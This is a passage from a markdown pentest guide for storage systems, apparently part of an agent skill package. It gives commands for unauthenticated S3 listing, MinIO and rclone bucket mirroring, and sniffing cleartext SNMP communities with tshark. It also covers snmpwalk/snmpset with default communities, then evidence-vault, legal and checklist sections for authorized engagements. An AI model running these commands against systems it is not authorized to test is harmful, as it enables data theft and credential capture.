aws s3api list-objects-v2 --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request

# Authenticated enumeration
aws s3api list-buckets --profile REPLACE_WITH_PROFILE_NAME
aws s3api list-objects-v2 --bucket REPLACE_WITH_BUCKET_NAME --profile REPLACE_WITH_PROFILE_NAME

# Get bucket ACL + policy
aws s3api get-bucket-acl --bucket REPLACE_WITH_BUCKET_NAME --profile REPLACE_WITH_PROFILE_NAME
aws s3api get-bucket-policy --bucket REPLACE_WITH_BUCKET_NAME --profile REPLACE_WITH_PROFILE_NAME

# Get Object Lock config
aws s3api get-object-lock-configuration \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --profile REPLACE_WITH_PROFILE_NAME
```

### 7.5 MinIO Client (mc)

```bash
# Alias setup
mc alias set myminio http://10.0.0.5:9000 \
  REPLACE_WITH_YOUR_KEY REPLACE_WITH_YOUR_SECRET

# List buckets
mc ls myminio/

# List objects in a bucket
mc ls myminio/REPLACE_WITH_BUCKET_NAME/

# Mirror a bucket locally (recursive download)
mc mirror myminio/REPLACE_WITH_BUCKET_NAME ./out

# Set anonymous access policy
mc anonymous set download myminio/REPLACE_WITH_BUCKET_NAME  # make public
mc anonymous set none myminio/REPLACE_WITH_BUCKET_NAME      # make private

# Admin operations (requires admin credentials)
mc admin info myminio
mc admin user list myminio
mc admin policy list myminio
```

### 7.6 rclone

```bash
# Configure rclone for S3-compatible storage
rclone config
#   Choose: s3
#   Choose provider: AWS S3, MinIO, Ceph, Wasabi, Alibaba, Cloudflare, etc.
#   Enter access key + secret key + endpoint

# List buckets
rclone lsd myminio:

# List objects
rclone ls myminio:REPLACE_WITH_BUCKET_NAME/

# Sync (one-way copy)
rclone sync myminio:REPLACE_WITH_BUCKET_NAME ./out

# Copy with bandwidth limit (engagement-friendly)
rclone copy myminio:REPLACE_WITH_BUCKET_NAME ./out --bwlimit 10M
```

### 7.7 Wireshark / tshark

```bash
# Capture iSCSI
tshark -i eth0 -f 'tcp port 3260' -w /tmp/iscsi.pcap

# Dissect iSCSI
tshark -r /tmp/iscsi.pcap -Y 'iscsi' \
  -T fields -e frame.number -e iscsi.opcode -e iscsi.lun -e scsi.cdb

# Capture NFS
tshark -i eth0 -f 'tcp port 2049 or udp port 2049' -w /tmp/nfs.pcap

# Dissect NFS
tshark -r /tmp/nfs.pcap -Y 'nfs' \
  -T fields -e frame.number -e nfs.filename -e nfs.fh_hash

# Capture SMB
tshark -i eth0 -f 'tcp port 445' -w /tmp/smb.pcap

# Dissect SMB2
tshark -r /tmp/smb.pcap -Y 'smb2' \
  -T fields -e frame.number -e smb2.cmd -e smb2.filename

# Capture S3 (HTTPS, will not see body without key)
tshark -i eth0 -f 'tcp port 443 or tcp port 9000' -w /tmp/s3.pcap

# Capture NDMP
tshark -i eth0 -f 'tcp port 10000' -w /tmp/ndmp.pcap

# Extract cleartext SNMP community
tshark -i eth0 -f 'udp port 161' -Y 'snmp' \
  -T fields -e snmp.community
```

### 7.8 snmpwalk

```bash
# System description (vendor fingerprint)
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.2.1.1.1

# All OIDs under a vendor subtree
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.789  # NetApp
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.6574 # Synology
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.24681 # QNAP

# Host resources (storage topology)
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.2.1.25.2  # storage tables
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.2.1.25.4  # running processes
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.2.1.25.6  # installed software

# Test RW community
snmpset -v2c -c private 10.0.0.5 .1.3.6.1.2.1.1.6.0 s "TEST"
#   If error: "no access" or "not writable" → community is RO
#   If success: community is RW (CRITICAL finding)
```

---

## 8. Evidence Collection

Storage engagements generate large evidence volumes. Plan for safe handling.

### 8.1 Evidence Inventory

For each finding, capture:
- Command (exact invocation)
- Output (truncated if >10MB; full output in vault)
- Screenshot (for web admin findings)
- Pcap (for protocol-level findings)
- Timestamp (UTC, ISO 8601)
- Target identifier (IP / hostname / bucket name)

### 8.2 Evidence Vault

```
vault/
├── engagement-YYYY-MM-DD/
│   ├── findings/
│   │   ├── sn-001-iscsi-unauth-login/
│   │   │   ├── command.txt
│   │   │   ├── output.txt
│   │   │   ├── screenshot.png
│   │   │   └── iscsi.pcap
│   │   └── sn-002-nfs-no-root-squash/
│   │       └── ...
│   ├── loot/
│   │   ├── lun0.dd              # disk image from iSCSI LUN
│   │   ├── bucket-name/         # downloaded S3 objects
│   │   └── tape_dump.bin        # NDMP tape dump
│   ├── pcaps/
│   │   ├── full-engagement.pcapng
│   │   └── targeted/
│   └── reports/
│       ├── draft.md
│       └── final.pdf
```

### 8.3 Encryption at Rest

```bash
# Encrypt the entire vault with gocryptfs
sudo apt install -y gocryptfs
mkdir vault_cipher vault_plain
gocryptfs -init vault_cipher
#   Record password in engagement password manager
gocryptfs vault_cipher vault_plain

# After work: unmount
fusermount -u vault_plain
```

### 8.4 Retention + Destruction

- Engagement contract specifies retention (typically 30-90 days after final report)
- After retention: `shred -uvz` all vault files
- Maintain destruction log: filename, size, SHA-256 (pre-destruction), timestamp, witness signature

### 8.5 Legal Considerations

- Storage systems hold regulated data (PII, PHI, financial records, payment data)
- Engagements involving PCI-DSS, HIPAA, GDPR data require additional scoping with the customer's legal counsel
- Cross-border data transfer (e.g., EU to US) may violate GDPR
- Ransomware simulation is a destructive test; require explicit authorization separate from pentest scope
- Coordinate with the customer's IR team before testing, especially for ransomware scenarios

---

## Appendix A: Quick Engagement Checklist

```
[ ] Scope confirmed in writing (appliances, buckets, protocols)
[ ] Read-only default; separate authorization for any write test
[ ] Ransomware simulation: separate signed authorization
[ ] Engagement vault encrypted with gocryptfs
[ ] Backup of appliance configuration captured BEFORE engagement
[ ] Snapshot of every LUN captured BEFORE engagement (customer-side)
[ ] Customer storage admin on call during engagement
[ ] Customer SOC notified of engagement window
[ ] IR runbook accessible during engagement
[ ] After engagement: restore any test objects; verify with customer
[ ] After retention: shred vault; maintain destruction log
```

## Appendix B: References

- **RFC 3720** (iSCSI): [datatracker.ietf.org/doc/html/rfc3720](https://datatracker.ietf.org/doc/html/rfc3720)
- **RFC 7143** (iSCSI updates): [datatracker.ietf.org/doc/html/rfc7143](https://datatracker.ietf.org/doc/html/rfc7143)
- **RFC 7530** (NFSv4): [datatracker.ietf.org/doc/html/rfc7530](https://datatracker.ietf.org/doc/html/rfc7530)
- **MS-SMB2**: Microsoft SMB2 Protocol Specification
- **MS-NLMP**: Microsoft NTLM Protocol Specification
- **NetApp ONTAP Security Hardening**: [docs.netapp.com/ontap/security-hardening](https://docs.netapp.com/ontap/topic/com.netapp.doc.pow-nav_secuar-wacli/GUID-0B521D5E-2F5E-49F1-B5F5-1B6B5D5B5D5B.html)
- **Dell EMC Unity Security Guide**: Dell support site
- **Pure Storage Security Hardening**: support.purestorage.com
- **QNAP Security Best Practices**: [qnap.com/en/security-advisory](https://www.qnap.com/en/security-advisory)
- **Synology Security Best Practices**: [synology.com/en-us/security](https://www.synology.com/en-us/security)
- **TrueNAS Documentation**: [truenas.com/docs](https://www.truenas.com/docs/)
- **AWS S3 Security**: [docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- **AWS IAM Best Practices**: [docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- **MinIO Security**: [min.io/docs/minio/linux/operations/security.html](https://min.io/docs/minio/linux/operations/security.html)
- **CISA Advisory on QNAP DeadBolt**: search [cisa.gov/news-events/cybersecurity-advisories](https://www.cisa.gov/news-events/cybersecurity-advisories) for current advisories
- **SNIA Storage Security White Paper**: [snia.org/education/storage_networking_primer/storage_security](https://www.snia.org/education/storage_networking_primer/storage_security)
- **NCSC Cloud Storage Security**: [ncsc.gov.uk/collection/cloud-security-online-guide](https://www.ncsc.gov.uk/collection/cloud-security-online-guide)
- **NIST SP 800-209** (Storage Security): [csrc.nist.gov/publications/detail/sp/800-209/final](https://csrc.nist.gov/publications/detail/sp/800-209/final)

---

## Cross-References

- `SKILL.md` — Skill overview, use cases, methodology
- `payloads.md` — Attack payloads by attack surface (iSCSI, FC, NFS, SMB, S3, vendor APIs, NDMP, SNMP, replication, ransomware)
- `test-cases.md` — 12 structured test cases (TC-SN-001 through TC-SN-012)
- `skills/database-attack/` — RDBMS/NoSQL direct attack
- `skills/cloud-security/` — Broader cloud posture
- `skills/ad-ldap-attack/` — Domain-joined appliance context
- `skills/cloud-native-vuln-research/` — CVE research (vs. this skill's pentest focus)
